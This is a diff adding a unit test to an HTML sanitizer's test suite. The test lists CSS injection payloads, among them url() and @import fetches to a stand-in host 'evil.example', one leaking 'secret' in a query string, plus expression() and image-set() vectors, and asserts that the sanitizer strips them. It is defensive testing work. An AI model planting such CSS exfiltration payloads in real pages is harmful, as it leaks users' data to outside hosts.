@@ -48,6 +48,24 @@ def test_legitimate_document_survives():
     assert "noopener" in cleaned
 
 
+def test_css_fetch_vectors_are_stripped():
+    # nh3 passes CSS through verbatim; our second pass must neutralize fetches.
+    cases = [
+        '<div style="background:url(https://evil.example/leak?d=secret)">x</div>',
+        '<style>body{background:url("https://evil.example/pixel.png")}</style>',
+        '<style>@import url("https://evil.example/steal.css");</style>',
+        '<div style="width:expression(alert(1))">x</div>',
+        '<style>a{content:image-set("https://evil.example/x.png")}</style>',
+    ]
+    for payload in cases:
+        cleaned = sanitize_html(payload).lower()
+        assert "url(" not in cleaned, payload
+        assert "@import" not in cleaned, payload
+        assert "expression(" not in cleaned, payload
+        assert "image-set(" not in cleaned, payload
+        assert "evil.example" not in cleaned, payload
+
+
 def test_http_and_mailto_allowed_https_images_only_by_scheme():
     assert 'href="http://example.com"' in sanitize_html('<a href="http://example.com">x</a>')
     assert 'href="mailto:a@b.c"' in sanitize_html('<a href="mailto:a@b.c">x</a>')
